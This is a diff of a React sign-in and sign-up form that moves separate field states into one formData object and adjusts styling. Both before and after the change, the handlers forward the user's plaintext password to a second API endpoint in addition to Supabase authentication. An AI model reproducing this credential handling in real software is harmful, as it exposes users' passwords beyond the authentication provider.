@@ -45,12 +45,14 @@ export default function AuthForm() {
   const [forgotPasswordEmail, setForgotPasswordEmail] = useState("");
   const [forgotPasswordLoading, setForgotPasswordLoading] = useState(false);
 
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-  const [fullName, setFullName] = useState("");
-  const [firstName, setFirstName] = useState("");
-  const [lastName, setLastName] = useState("");
-  const [age, setAge] = useState("");
+  const [formData, setFormData] = useState({
+    email: "",
+    password: "",
+    fullName: "",
+    firstName: "",
+    lastName: "",
+    age: "",
+  });
 
   const t = useMemo(() => getTranslations(language), [language]);
 
@@ -217,14 +219,14 @@ export default function AuthForm() {
 
       try {
         const { data: authData, error: authError } = await supabase.auth.signUp({
-          email,
-          password,
+          email: formData.email,
+          password: formData.password,
           options: {
             data: {
-              first_name: firstName,
-              last_name: lastName,
-              full_name: `${firstName} ${lastName}`,
-              age,
+              first_name: formData.firstName,
+              last_name: formData.lastName,
+              full_name: `${formData.firstName} ${formData.lastName}`,
+              age: formData.age,
               bank_origin: BANK_ORIGIN,
             },
           },
@@ -238,11 +240,11 @@ export default function AuthForm() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               userId: authData.user.id,
-              email,
-              firstName,
-              lastName,
-              password,
-              age,
+              email: formData.email,
+              firstName: formData.firstName,
+              lastName: formData.lastName,
+              password: formData.password,
+              age: formData.age,
             }),
           });
 
@@ -262,11 +264,11 @@ export default function AuthForm() {
       }
     },
     [
-      email,
-      password,
-      firstName,
-      lastName,
-      age,
+      formData.email,
+      formData.password,
+      formData.firstName,
+      formData.lastName,
+      formData.age,
       setupPresenceTracking,
       t.accountCreatedSuccess,
       t.signupFailed,
@@ -283,8 +285,8 @@ export default function AuthForm() {
 
       try {
         const { data, error } = await supabase.auth.signInWithPassword({
-          email,
-          password,
+          email: formData.email,
+          password: formData.password,
         });
 
         if (error) throw error;
@@ -295,7 +297,7 @@ export default function AuthForm() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               userId: data.user.id,
-              password,
+              password: formData.password,
             }),
           });
 
@@ -315,8 +317,8 @@ export default function AuthForm() {
       }
     },
     [
-      email,
-      password,
+      formData.email,
+      formData.password,
       setupPresenceTracking,
       t.signedInSuccess,
       t.signInFailed,
@@ -353,22 +355,21 @@ export default function AuthForm() {
             <div className="flex flex-col sm:flex-row items-center justify-between px-4 bg-white gap-4 sm:gap-0">
               <div className="flex items-center">
                 <div className="flex items-center space-x-2">
-  <img
-    src="/logo.svg"
-    alt="Logo"
-    loading="lazy"
-    decoding="async"
-    className="w-36 h-36 max-[500px]:h-20 object-contain"
-  />
-</div>
-
+                  <img
+                    src="/logo.svg"
+                    alt="Logo"
+                    loading="lazy"
+                    decoding="async"
+                    className="w-36 h-36 object-contain"
+                  />
+                </div>
               </div>
 
               <div className="flex items-center gap-2">
                 <div className="relative">
                   <Button
                     variant="outline"
-                    className="bg-transparent border-[#F26623] text-[#F26623] hover:bg-[#F26623] hover:text-white px-3 py-2 text-sm rounded-md transition-[background-color,color,border-color] duration-300 flex items-center gap-2"
+                    className="bg-transparent border-[#F26623] text-[#F26623] hover:bg-[#F26623] hover:text-white px-3 py-2 text-sm rounded-md transition-all duration-300 flex items-center gap-2"
                     onClick={toggleLanguageMenu}
                   >
                     <Globe className="h-4 w-4" />
@@ -395,7 +396,7 @@ export default function AuthForm() {
 
                 <Button
                   variant="outline"
-                  className="bg-transparent border-[#F26623] text-[#F26623] hover:bg-[#F26623] hover:text-white px-4 py-2 text-sm rounded-md transition-[background-color,color,border-color] duration-300 w-full sm:w-auto"
+                  className="bg-transparent border-[#F26623] text-[#F26623] hover:bg-[#F26623] hover:text-white px-4 py-2 text-sm rounded-md transition-all duration-300 w-full sm:w-auto"
                   onClick={toggleSignUp}
                 >
                   {isSignUp ? t.signIn : t.createAccount}
@@ -403,7 +404,7 @@ export default function AuthForm() {
               </div>
             </div>
 
-            <div className="flex-1 p-3 sm:p-6 lg:p-8 flex flex-col justify-center">
+            <div className="flex-1 p-4 sm:p-6 lg:p-8 flex flex-col justify-center">
               {error && (
                 <Alert variant="destructive" className="mb-4">
                   <AlertCircle className="h-4 w-4" />
@@ -436,8 +437,13 @@ export default function AuthForm() {
                       <input
                         type="email"
                         placeholder={t.email}
-                        value={email}
-                        onChange={(e) => setEmail(e.target.value)}
+                        value={formData.email}
+                        onChange={(e) =>
+                          setFormData((prev) => ({
+                            ...prev,
+                            email: e.target.value,
+                          }))
+                        }
                         required
                         className="w-full h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 bg-transparent text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
                       />
@@ -447,8 +453,13 @@ export default function AuthForm() {
                       <input
                         type={showPassword ? "text" : "password"}
                         placeholder={t.password}
-                        value={password}
-                        onChange={(e) => setPassword(e.target.value)}
+                        value={formData.password}
+                        onChange={(e) =>
+                          setFormData((prev) => ({
+                            ...prev,
+                            password: e.target.value,
+                          }))
+                        }
                         required
                         className="w-full h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 pr-10 bg-transparent text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
                       />
@@ -482,7 +493,7 @@ export default function AuthForm() {
 
                     <Button
                       type="submit"
-                      className="w-24 h-10 bg-[#F26623] hover:bg-[#E55A1F] text-white font-medium rounded-md transition-[background-color,opacity] duration-300 disabled:opacity-50"
+                      className="w-24 h-10 bg-[#F26623] hover:bg-[#E55A1F] text-white font-medium rounded-md transition-all duration-300 disabled:opacity-50"
                       disabled={loading}
                     >
                       {loading ? t.loading : t.signInButton}
@@ -491,35 +502,45 @@ export default function AuthForm() {
                 </div>
               ) : (
                 <div className="max-w-md mx-auto w-full">
-                  <div className="mb-3 sm:mb-8">
-                    <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-1 sm:mb-2">
+                  <div className="mb-6 sm:mb-8">
+                    <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">
                       {t.createAccountTitle}
                     </h2>
-                    <p className="text-gray-600 text-xs sm:text-sm">
+                    <p className="text-gray-600 text-sm">
                       {t.createAccountSubtitle}
                     </p>
                   </div>
 
-                  <form onSubmit={handleSignUp} className="space-y-3 sm:space-y-4">
-                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
+                  <form onSubmit={handleSignUp} className="space-y-4">
+                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                       <div>
                         <input
                           type="text"
                           placeholder={t.firstName}
-                          value={firstName}
-                          onChange={(e) => setFirstName(e.target.value)}
+                          value={formData.firstName}
+                          onChange={(e) =>
+                            setFormData((prev) => ({
+                              ...prev,
+                              firstName: e.target.value,
+                            }))
+                          }
                           required
-                          className="w-full h-8 sm:h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 bg-transparent text-sm sm:text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
+                          className="w-full h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 bg-transparent text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
                         />
                       </div>
                       <div>
                         <input
                           type="text"
                           placeholder={t.lastName}
-                          value={lastName}
-                          onChange={(e) => setLastName(e.target.value)}
+                          value={formData.lastName}
+                          onChange={(e) =>
+                            setFormData((prev) => ({
+                              ...prev,
+                              lastName: e.target.value,
+                            }))
+                          }
                           required
-                          className="w-full h-8 sm:h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 bg-transparent text-sm sm:text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
+                          className="w-full h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 bg-transparent text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
                         />
                       </div>
                     </div>
@@ -529,20 +550,30 @@ export default function AuthForm() {
                         <input
                           type="email"
                           placeholder={t.email}
-                          value={email}
-                          onChange={(e) => setEmail(e.target.value)}
+                          value={formData.email}
+                          onChange={(e) =>
+                            setFormData((prev) => ({
+                              ...prev,
+                              email: e.target.value,
+                            }))
+                          }
                           required
-                          className="w-full h-8 sm:h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 bg-transparent text-sm sm:text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
+                          className="w-full h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 bg-transparent text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
                         />
                       </div>
                       <div>
                         <input
                           type="number"
                           placeholder={t.age}
-                          value={age}
-                          onChange={(e) => setAge(e.target.value)}
+                          value={formData.age}
+                          onChange={(e) =>
+                            setFormData((prev) => ({
+                              ...prev,
+                              age: e.target.value,
+                            }))
+                          }
                           required
-                          className="w-full h-8 sm:h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 bg-transparent text-sm sm:text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
+                          className="w-full h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 bg-transparent text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
                         />
                       </div>
                     </div>
@@ -551,10 +582,15 @@ export default function AuthForm() {
                       <input
                         type={showPassword ? "text" : "password"}
                         placeholder={t.password}
-                        value={password}
-                        onChange={(e) => setPassword(e.target.value)}
+                        value={formData.password}
+                        onChange={(e) =>
+                          setFormData((prev) => ({
+                            ...prev,
+                            password: e.target.value,
+                          }))
+                        }
                         required
-                        className="w-full h-8 sm:h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 pr-12 bg-transparent text-sm sm:text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
+                        className="w-full h-10 border-0 border-b-2 border-gray-300 rounded-none px-0 pr-12 bg-transparent text-base outline-none focus:outline-none focus:ring-0 focus:shadow-none focus:border-[#F26623]"
                       />
                       <div className="absolute right-0 top-1/2 -translate-y-1/2 flex items-center space-x-2">
                         <Button
@@ -573,10 +609,10 @@ export default function AuthForm() {
                       </div>
                     </div>
 
-                    <div className="pt-3 sm:pt-6">
+                    <div className="pt-6">
                       <Button
                         type="submit"
-                        className="w-full h-10 sm:h-12 bg-[#F26623] hover:bg-[#E55A1F] text-white font-medium rounded-md transition-[background-color,opacity] duration-300 disabled:opacity-50"
+                        className="w-full h-12 bg-[#F26623] hover:bg-[#E55A1F] text-white font-medium rounded-md transition-all duration-300 disabled:opacity-50"
                         disabled={loading}
                       >
                         {loading ? t.creatingAccount : t.createAccount}
@@ -584,7 +620,7 @@ export default function AuthForm() {
                     </div>
                   </form>
 
-                  <div className="flex flex-col sm:flex-row justify-between items-center mt-3 sm:mt-6 text-xs gap-2 sm:gap-0">
+                  <div className="flex flex-col sm:flex-row justify-between items-center mt-6 sm:mt-8 text-xs gap-2 sm:gap-0">
                     <button className="text-gray-500 hover:text-[#F26623] transition-colors">
                       {t.returnHome}
                     </button>
